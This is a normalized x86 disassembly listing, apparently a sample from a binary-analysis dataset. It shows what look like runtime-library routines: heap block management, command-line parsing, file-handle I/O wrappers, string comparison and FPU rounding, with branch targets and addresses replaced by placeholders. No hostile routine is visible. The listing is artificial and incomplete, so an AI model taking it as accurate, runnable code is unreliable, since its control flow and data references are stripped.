xor eax eax
call sub_401460
test al al
je r-xdata
push 0xa
call sub_4013f0
sub_40263c
push ebx
mov ebx eax
call sub_4025c8
test al al
je r-xdata
xor eax eax
mov eax [ rw-data ]
cmp [ eax ] 0x3ffe
jge r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ rw-data ]
mov [ edx + eax * 4 + 0x4 ] ebx
mov eax [ rw-data ]
inc [ eax ]
mov al 0x1
jmp r-xdata
mov [ rw-data ] 0x0
pop ebx
retn
sub_40267c
push ebx
push esi
push edi
mov esi eax
mov edi rw-data
xor ebx ebx
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
call sub_4025c8
test al al
je r-xdata
mov eax [ edi ]
mov edx [ eax ]
dec edx
test edx edx
jl r-xdata
mov [ rw-data ] 0x0
inc edx
xor eax eax
inc eax
dec edx
jne r-xdata
mov edx [ edi ]
mov edx [ edx ]
mov ecx [ edi ]
mov edx [ ecx + edx * 4 ]
mov ecx [ edi ]
mov [ ecx + eax * 4 + 0x4 ] edx
mov edx [ edi ]
dec [ edx ]
mov bl 0x1
jmp r-xdata
mov ecx [ edi ]
cmp esi [ ecx + eax * 4 + 0x4 ]
jne r-xdata
sub_4026d4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
sub eax rw-data
shr eax 0x5
shl eax 0x8
mov edx [ ebp + 0x8 ]
lea esi [ edx + eax * 8 - 0x1b800 ]
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_402334
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x1c ]
jbe r-xdata
mov eax [ ebp - 0x18 ]
sub eax 0x4
test [ eax ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
movzx eax [ eax + 0x2 ]
add [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_40267c
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1b801 ] 0x0
xor ebx ebx
mov eax [ ebp - 0x18 ]
call sub_4025a0
mov edi eax
test edi edi
jne r-xdata
mov ebx 0x2
mov eax [ ebp - 0x18 ]
cmp [ eax ] 0x100
jae r-xdata
cmp ebx 0xff
jg r-xdata
cmp [ esi + ebx * 8 ] 0x0
je r-xdata
inc [ esi + ebx * 8 + 0x4 ]
mov eax [ ebp - 0x18 ]
add eax 0x4
mov eax [ eax ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jle r-xdata
xor ebx ebx
mov [ esi + ebx * 8 ] edi
jmp r-xdata
inc ebx
cmp ebx 0xff
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
movzx eax [ eax + 0x2 ]
sub eax 0xd
cmp eax [ ebp - 0xc ]
jl r-xdata
cmp edi [ esi + ebx * 8 ]
je r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x11 ] 0x1
mov eax [ ebp - 0xc ]
test eax eax
jle r-xdata
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax ] 0x20
jb r-xdata
mov ebx 0x1
jmp r-xdata
mov [ ebp - 0x11 ] al
inc [ ebp - 0x10 ]
dec [ ebp - 0x20 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax ] 0x80
jb r-xdata
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov al 0x1
sub_402820
push ebp
mov ebp esp
push eax
mov eax 0x27
add esp 0xfffff004
push eax
dec eax
jne r-xdata
mov eax [ ebp - 0x4 ]
add esp 0xfffff6dc
push ebx
push esi
push edi
lea eax [ ebp - 0x1b800 ]
xor ecx ecx
mov edx 0x1b800
call sub_403af4
lea eax [ ebp - 0x1f828 ]
xor ecx ecx
mov edx 0x4000
call sub_403af4
xor eax eax
mov [ ebp - 0x1b808 ] eax
mov [ ebp - 0x1b801 ] 0x1
mov edi [ rw-data ]
jmp r-xdata
cmp edi rw-data
jne r-xdata
mov eax edi
call sub_4022f4
mov ebx eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov edi [ edi + 0x4 ]
mov eax ebx
sub eax 0x4
mov esi [ eax ]
test esi 0x1
jne r-xdata
cmp ebx rw-data
je r-xdata
mov eax ebx
call sub_4022d0
mov ebx eax
test ebx ebx
jne r-xdata
test esi 0x4
je r-xdata
cmp [ ebp - 0x1b801 ] 0x0
jne r-xdata
cmp [ ebp - 0x1b808 ] 0x1000
jl r-xdata
cmp [ ebp - 0x1b808 ] 0x1000
jge r-xdata
push ebp
mov eax ebx
call sub_4026d4
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x1b809 ] 0x0
xor eax eax
mov [ ebp - 0x1b818 ] eax
lea edx [ ebp - 0x27828 ]
mov eax r-xdata
mov ecx 0x28
call sub_40248c
mov ebx eax
mov [ ebp - 0x1b810 ] 0x37
mov [ ebp - 0x1b824 ] rw-data
lea eax [ ebp - 0x1b004 ]
mov [ ebp - 0x1b828 ] eax
mov eax ebx
add eax 0x10
call sub_40267c
test al al
jne r-xdata
and esi 0xfffffff0
sub esi 0x4
mov [ ebp - 0x1b814 ] esi
mov eax ebx
call sub_40267c
test al al
jne r-xdata
mov eax [ ebp - 0x1b81c ]
mov [ ebp - 0x1b818 ] eax
add [ ebp - 0x1b828 ] 0x800
add [ ebp - 0x1b824 ] 0x20
dec [ ebp - 0x1b810 ]
jne r-xdata
cmp [ esi ] 0x0
jbe r-xdata
mov ebx [ ebx + 0x4 ]
mov [ ebp - 0x1b801 ] 0x0
mov esi [ ebx + 0xc ]
and esi 0xfffffff0
sub esi 0x4
sub esi 0x10
mov eax [ ebp - 0x1b808 ]
mov [ ebp + eax * 4 - 0x1f828 ] esi
inc [ ebp - 0x1b808 ]
mov [ ebp - 0x1b801 ] 0x0
mov eax [ ebp - 0x1b808 ]
mov edx [ ebp - 0x1b814 ]
mov [ ebp + eax * 4 - 0x1f828 ] edx
inc [ ebp - 0x1b808 ]
mov eax [ ebp - 0x1b824 ]
movzx eax [ eax ]
sub eax 0x4
mov [ ebp - 0x1b81c ] eax
mov [ ebp - 0x1b80a ] 0x0
mov edi 0xff
mov eax [ ebp - 0x1b828 ]
mov esi eax
cmp [ ebp - 0x1b808 ] 0x0
jle r-xdata
dec edi
sub esi 0x8
cmp edi 0xffffffff
jne r-xdata
cmp [ ebp - 0x1b809 ] 0x0
jne r-xdata
mov eax r-xdata
mov ecx 0x3
mov edx ebx
call sub_40248c
push 0x2010
push r-xdata
lea eax [ ebp - 0x27828 ]
push eax
push 0x0
call sub_4012cc
cmp [ ebp - 0x1b809 ] 0x0
je r-xdata
lea eax [ ebp - 0x20029 ]
cmp ebx eax
ja r-xdata
cmp [ ebp - 0x1b80a ] 0x0
jne r-xdata
mov eax r-xdata
mov ecx 0x27
mov edx ebx
call sub_40248c
mov ebx eax
mov [ ebp - 0x1b809 ] 0x1
mov eax r-xdata
mov ecx 0x3c
mov edx ebx
call sub_40248c
mov ebx eax
mov edi [ ebp - 0x1b808 ]
dec edi
test edi edi
jb r-xdata
mov [ ebx ] 0xd
inc ebx
mov [ ebx ] 0xa
inc ebx
mov [ ebx ] 0xd
inc ebx
mov [ ebx ] 0xa
inc ebx
mov [ ebx ] 0x2c
inc ebx
mov [ ebx ] 0x20
inc ebx
mov [ ebx ] 0xd
inc ebx
mov [ ebx ] 0xa
inc ebx
mov eax [ ebp - 0x1b818 ]
inc eax
mov edx ebx
call sub_402370
mov ebx eax
mov [ ebx ] 0x20
inc ebx
mov [ ebx ] 0x2d
inc ebx
mov [ ebx ] 0x20
inc ebx
mov edx ebx
mov eax [ ebp - 0x1b81c ]
call sub_402370
mov ebx eax
mov eax r-xdata
mov ecx 0x8
mov edx ebx
call sub_40248c
mov ebx eax
mov [ ebp - 0x1b80a ] 0x1
jmp r-xdata
inc edi
mov [ ebp - 0x1b820 ] 0x0
lea esi [ ebp - 0x1f828 ]
mov eax r-xdata
mov ecx 0x7
mov edx ebx
call sub_40248c
mov ebx eax
jmp r-xdata
je r-xdata
mov eax edi
sub eax 0x1
jb r-xdata
mov eax [ esi ]
mov edx ebx
call sub_402370
mov ebx eax
lea eax [ ebp - 0x20029 ]
cmp ebx eax
ja r-xdata
mov [ ebx ] 0x2c
inc ebx
mov [ ebx ] 0x20
inc ebx
mov [ ebx ] 0x20
inc ebx
mov [ ebx ] 0x78
inc ebx
mov [ ebx ] 0x20
inc ebx
mov eax [ esi ]
mov edx ebx
call sub_402370
mov ebx eax
mov eax r-xdata
mov ecx 0x6
mov edx ebx
call sub_40248c
mov ebx eax
jmp r-xdata
jmp r-xdata
inc [ ebp - 0x1b820 ]
add esi 0x4
dec edi
jne r-xdata
lea edx [ ebp - 0x27928 ]
mov eax [ esi - 0x4 ]
call sub_404530
movzx ecx [ ebp - 0x27928 ]
lea eax [ ebp - 0x27927 ]
mov edx ebx
call sub_40248c
mov ebx eax
cmp [ ebp - 0x1b820 ] 0x0
je r-xdata
sub_402c98
push esi
push edi
xor eax eax
xor esi esi
mov edx rw-data
movzx edi [ edx ]
shr edi 0x3
mov ecx esi
add ecx ecx
add ecx ecx
cmp edi eax
jbe r-xdata
test [ edx ] 0xf
jne r-xdata
mov eax edi
mov [ eax + rw-data ] cl
inc eax
cmp edi eax
ja r-xdata
inc esi
add edx 0x20
cmp esi 0x37
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
retn
sub_402cdc
push ebx
push esi
push edi
mov esi 0x37
mov ebx rw-data
lea eax [ ebx - 0x1c ]
mov [ ebx - 0x8 ] eax
lea eax [ ebx - 0x1c ]
mov [ ebx - 0x18 ] eax
xor eax eax
mov [ ebx - 0x10 ] eax
mov [ ebx - 0x14 ] 0x1
movzx eax [ ebx - 0x1a ]
add eax eax
add eax eax
lea eax [ eax + eax * 2 ]
add eax 0xef
and eax 0xffffff00
add eax 0x30
cmp eax 0xb30
jae r-xdata
mov [ ebx ] sub_4015a0
add eax 0x4d0
shr eax 0xd
cmp eax 0x7
jbe r-xdata
mov eax 0xb30
mov ecx eax
mov dl 0xff
shl dl cl
mov [ ebx - 0x1b ] dl
shl eax 0xd
add ax 0xb30
mov [ ebx - 0x4 ] ax
movzx edi [ ebx - 0x1a ]
movzx eax di
mov ecx eax
shl ecx 0x4
lea ecx [ ecx + ecx * 2 ]
add ecx 0xef
and ecx 0xffffff00
add ecx 0x30
cmp ecx 0x7330
jae r-xdata
mov eax 0x7
cmp ecx 0xff30
jbe r-xdata
mov ecx 0x7330
mov eax ecx
sub eax 0x20
movzx edx di
mov ecx edx
xor edx edx
div ecx
imul di
add ax 0xef
and ax 0xff00
add ax 0x30
mov [ ebx - 0x2 ] ax
add ebx 0x20
dec esi
jne r-xdata
mov ecx 0xff30
cmp [ ebx ] 0x0
jne r-xdata
call sub_402c98
mov [ rw-data ] rw-data
mov [ rw-data ] rw-data
mov esi 0x400
mov edx rw-data
mov eax edx
mov [ eax ] eax
mov [ eax + 0x4 ] eax
add edx 0x8
dec esi
jne r-xdata
mov [ rw-data ] rw-data
mov [ rw-data ] rw-data
pop edi
pop esi
pop ebx
retn
sub_402e04
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi [ ebx + 0x4 ]
jmp r-xdata
cmp edi ebx
jne r-xdata
mov ebp [ edi + 0x4 ]
push 0x8000
push 0x0
push edi
call sub_4013e8
mov edi ebp
mov edx 0x37
mov eax rw-data
mov ecx eax
mov [ eax + 0x14 ] ecx
mov ecx eax
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x1
xor ecx ecx
mov [ eax + 0xc ] ecx
add eax 0x20
dec edx
jne r-xdata
mov [ ebx ] ebx
mov [ ebx + 0x4 ] ebx
mov edx 0x400
mov ecx rw-data
mov eax ecx
mov [ eax ] eax
mov [ eax + 0x4 ] eax
add ecx 0x8
dec edx
jne r-xdata
mov ebx [ esi + 0x4 ]
jmp r-xdata
cmp ebx esi
jne r-xdata
mov edi [ ebx + 0x4 ]
push 0x8000
push 0x0
push ebx
call sub_4013e8
mov ebx edi
mov [ esi ] esi
mov [ esi + 0x4 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_402e94
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call sub_4013f8
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
call sub_402820
call sub_402e04
retn
push 0x8000
push 0x0
mov eax [ rw-data ]
push eax
call sub_4013e8
xor eax eax
mov [ rw-data ] eax
sub_402f34
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_403050
mov [ ecx ] eax
mov al 0x2
jmp sub_403050
retn
mov [ ecx ] eax
retn
sub_402fc4
push ebx
push esi
call sub_407688
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_407688
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_407688
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_403004
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_407688
mov ebx [ eax + 0x4 ]
jmp r-xdata
movzx eax bl
mov edx esi
call sub_402ff8
movzx eax bl
movzx ebx [ eax + rw-data ]
sub_403098
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4030fc
cmp eax edx
je r-xdata
retn
cmp ecx 0x20
ja r-xdata
jle r-xdata
sub ecx 0x8
jg r-xdata
retn
cmp eax edx
ja r-xdata
fild [ ecx + eax ]
fild [ eax ]
cmp ecx 0x8
jle r-xdata
jmp [ ecx * 4 + r-xdata ]
push edx
fild [ eax ]
lea eax [ ecx + eax - 0x8 ]
lea ecx [ edx + ecx - 0x8 ]
fild [ eax ]
push ecx
neg ecx
and edx 0xfffffff8
lea ecx [ edx + ecx + 0x8 ]
pop edx
sub edx ecx
cmp eax edx
lea edx [ ecx + edx ]
jbe r-xdata
fistp [ edx ]
fistp [ ecx + edx ]
fild [ eax + 0x8 ]
cmp ecx 0x10
jle r-xdata
fild [ ecx + eax ]
fistp [ ecx + edx ]
add ecx 0x8
jl r-xdata
fistp [ edx ]
pop edx
fistp [ edx ]
retn
sub ecx 0x8
push ecx
fild [ ecx + eax ]
fild [ eax ]
add ecx edx
and ecx 0xfffffff8
sub ecx edx
fistp [ edx + 0x8 ]
fild [ eax + 0x10 ]
fistp [ edx + 0x10 ]
fild [ ecx + eax ]
fistp [ ecx + edx ]
sub ecx 0x8
jg r-xdata
pop ecx
fistp [ edx ]
fistp [ ecx + edx ]
sub_4031fc
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
cmp [ ebx ] 0x20
jbe r-xdata
xor ebp ebp
mov [ esp ] ebx
jmp r-xdata
cmp [ ebx + 0x1 ] 0x22
jne r-xdata
push ebx
call sub_4012a4
mov ebx eax
cmp [ ebx ] 0x20
ja r-xdata
add ebx 0x2
jmp r-xdata
cmp [ ebx ] 0x22
jne r-xdata
mov eax esi
mov edx ebp
call sub_405c6c
mov ebx [ esp ]
mov ebp [ esi ]
xor esi esi
jmp r-xdata
push ebx
call sub_4012a4
mov edi eax
mov eax edi
sub eax ebx
add ebp eax
mov ebx edi
push ebx
call sub_4012a4
mov ebx eax
jmp r-xdata
cmp [ ebx ] 0x20
ja r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
push ebx
call sub_4012a4
mov edi eax
cmp edi ebx
jbe r-xdata
push ebx
call sub_4012a4
mov ebx eax
jmp r-xdata
push ebx
call sub_4012a4
mov ebx eax
jmp r-xdata
push ebx
call sub_4012a4
mov edi eax
mov eax edi
sub eax ebx
add ebp eax
mov ebx edi
movzx eax [ ebx ]
mov [ ebp + esi ] al
inc ebx
inc esi
cmp edi ebx
ja r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
push ebx
call sub_4012a4
mov ebx eax
jmp r-xdata
push ebx
call sub_4012a4
mov edi eax
cmp edi ebx
jbe r-xdata
movzx eax [ ebx ]
mov [ ebp + esi ] al
inc ebx
inc esi
cmp edi ebx
ja r-xdata
sub_4032f8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_403349
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
call GetCommandLineA
lea edx [ ebp - 0x4 ]
call sub_4031fc
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_403350
lea eax [ ebp - 0x4 ]
call sub_405530
retn
inc esi
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4031fc
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_403358
push ebx
push esi
push edi
add esp 0xfffffef8
mov ebx edx
mov esi eax
mov eax ebx
call sub_405530
test esi esi
jne r-xdata
call GetCommandLineA
mov edi eax
push 0x105
lea eax [ esp + 0x4 ]
push eax
push 0x0
call sub_401304
mov ecx eax
mov edx esp
mov eax ebx
call sub_405620
jmp r-xdata
add esp 0x108
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
dec esi
jmp r-xdata
mov edx ebx
mov eax edi
call sub_4031fc
mov edi eax
test esi esi
je r-xdata
sub_4033b8
add esp 0xfffffff8
push esp
call QueryPerformanceCounter
test eax eax
je r-xdata
call sub_4013b4
mov [ rw-data ] eax
pop ecx
pop edx
retn
mov eax [ esp ]
mov [ rw-data ] eax
pop ecx
pop edx
retn
sub_403420
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
fld st0
sub esp 0x4
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
frndint
fwait
fldcw [ esp ]
add esp 0x4
fsubp st1
pop ebp
retn 0xc
sub_40345c
sub esp 0xc
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
fistp [ esp + 0x4 ]
fwait
fldcw [ esp ]
pop ecx
pop eax
pop edx
retn
sub_40349c
push ebx
push esi
mov esi edx
mov ebx eax
movzx eax [ ebx + 0x4 ]
cmp ax 0xd7b0
jb r-xdata
mov ebx 0x66
jmp r-xdata
cmp ax 0xd7b3
jbe r-xdata
test ebx ebx
je r-xdata
cmp ax 0xd7b0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ebx
call sub_40307c
mov [ ebx + 0x4 ] si
cmp [ ebx + 0x48 ] 0x0
jne r-xdata
mov eax ebx
call sub_403918
mov eax ebx
call [ ebx + 0x18 ]
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov [ ebx + 0x18 ] sub_4035c4
sub_403518
push ebx
mov ebx eax
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx ]
push eax
call sub_401274
test eax eax
jne r-xdata
xor eax eax
call sub_4012f4
cmp eax 0x6d
jne r-xdata
pop ebx
retn
xor eax eax
pop ebx
retn
sub_403558
push ebx
push esi
push ecx
mov ebx eax
mov esi [ ebx + 0xc ]
test esi esi
jne r-xdata
push 0x0
lea eax [ esp + 0x4 ]
push eax
push esi
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx ]
push eax
call sub_40129c
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
call sub_4012f4
jmp r-xdata
pop edx
pop esi
pop ebx
retn
xor edx edx
mov [ ebx + 0xc ] edx
sub_4035a4
push ebx
mov ebx eax
mov [ ebx + 0x4 ] 0xd7b0
mov eax [ ebx ]
call sub_403594
test al al
jne r-xdata
xor eax eax
pop ebx
retn
call sub_4012f4
pop ebx
retn
sub_4035c4
push esi
mov esi eax
xor eax eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov ax [ esi + 0x4 ]
sub eax 0xd7b1
je r-xdata
mov eax 0x80000000
mov edx 0x1
mov ecx 0x3
mov [ esi + 0x1c ] sub_403518
jmp r-xdata
dec eax
je r-xdata
mov [ esi + 0x24 ] sub_4035a4
mov [ esi + 0x20 ] sub_403554
cmp [ esi + 0x48 ] 0x0
je r-xdata
mov eax 0x40000000
mov edx 0x1
mov ecx 0x2
jmp r-xdata
dec eax
je r-xdata
lea eax [ esi + 0x14c ]
mov [ esi + 0x8 ] 0x80
mov [ esi + 0x24 ] sub_403554
mov [ esi + 0x14 ] eax
cmp [ esi + 0x4 ] 0xd7b2
je r-xdata
push 0x0
push 0x80
push ecx
push 0x0
push edx
push eax
lea eax [ esi + 0x48 ]
push eax
call sub_40124c
cmp eax 0xffffffff
je r-xdata
mov [ esi + 0x1c ] sub_403558
mov eax 0xc0000000
mov edx 0x1
mov ecx 0x3
jmp r-xdata
cmp esi rw-data
jne r-xdata
push 0xfffffff6
jmp r-xdata
mov [ esi + 0x4 ] 0xd7b0
call sub_4012f4
jmp r-xdata
mov [ esi ] eax
cmp [ esi + 0x4 ] 0xd7b3
jne r-xdata
pop esi
retn
push 0xfffffff5
push 0xfffffff4
jmp r-xdata
call sub_401264
cmp eax 0xffffffff
je r-xdata
cmp [ esi + 0x4 ] 0xd7b1
je r-xdata
dec [ esi + 0x4 ]
push 0x0
push [ esi ]
call sub_40125c
inc eax
je r-xdata
mov [ esi ] eax
xor eax eax
push [ esi ]
call GetFileType
test eax eax
je r-xdata
sub eax 0x81
jae r-xdata
push [ esi ]
call sub_401244
mov [ esi + 0x4 ] 0xd7b0
mov eax 0x69
jmp r-xdata
cmp eax 0x2
jne r-xdata
push 0x0
push 0x0
push eax
push [ esi ]
call sub_40128c
inc eax
je r-xdata
xor eax eax
mov [ esi + 0x20 ] sub_403558
push 0x0
mov edx esp
push 0x0
push edx
push 0x80
lea edx [ esi + 0x14c ]
push edx
push [ esi ]
call sub_401274
pop edx
dec eax
jne r-xdata
xor eax eax
cmp [ esi + eax + 0x14c ] 0xe
je r-xdata
push 0x2
push 0x0
sub eax edx
push eax
push [ esi ]
call sub_40128c
inc eax
je r-xdata
inc eax
jmp r-xdata
push [ esi ]
call sub_401284
dec eax
jne r-xdata
cmp eax edx
jae r-xdata
jmp r-xdata
sub_403770
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
xor ecx ecx
mov edx 0x14c
call sub_403af4
lea eax [ ebx + 0x14c ]
mov [ ebx + 0x14 ] eax
mov [ ebx + 0x4 ] 0xd7b0
movzx eax [ rw-data ]
mov [ ebx + 0x6 ] ax
mov [ ebx + 0x8 ] 0x80
mov [ ebx + 0x18 ] sub_4035c4
mov eax esi
call sub_40580c
push eax
mov eax esi
call sub_4059dc
lea edx [ ebx + 0x48 ]
pop ecx
call sub_4030fc
mov eax esi
call sub_40580c
mov [ ebx + eax + 0x48 ] 0x0
xor eax eax
pop esi
pop ebx
retn
sub_4037d8
push ebx
movzx ecx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_40307c
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_403848
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax [ ebp + 0x10 ]
movzx edx [ ebx + 0x4 ]
and edx eax
cmp eax edx
jne r-xdata
mov eax 0x67
call sub_40307c
xor eax eax
mov [ ebp - 0x4 ] eax
push 0x0
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
imul esi
push eax
push edi
mov eax [ ebx ]
push eax
call [ ebp + 0xc ]
test eax eax
jne r-xdata
mov ecx [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
xor edx edx
div ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
call sub_4012f4
call sub_40307c
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp esi [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
mov eax [ ebp + 0x8 ]
call sub_40307c
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_403918
push ebx
push esi
mov ebx eax
xor esi esi
movzx eax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_40307c
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_40307c
jmp r-xdata
sub_403970
push esi
push edi
mov edi eax
xor eax eax
mov al [ edi ]
mov esi edx
xor edx edx
mov dl [ esi ]
inc esi
add al dl
jb r-xdata
mov al cl
sub cl [ edi ]
jbe r-xdata
cmp al cl
ja r-xdata
pop edi
pop esi
retn
mov dl cl
jmp r-xdata
mov ecx edx
mov dl [ edi ]
mov [ edi ] al
inc edi
add edi edx
[ edi ] [ esi ]
sub_4039ac
push ebx
movzx ebx [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
movzx ecx cl
xchg edx eax
call sub_4030fc
pop ebx
retn
mov ecx ebx
sub_4039c8
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_403a4c
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
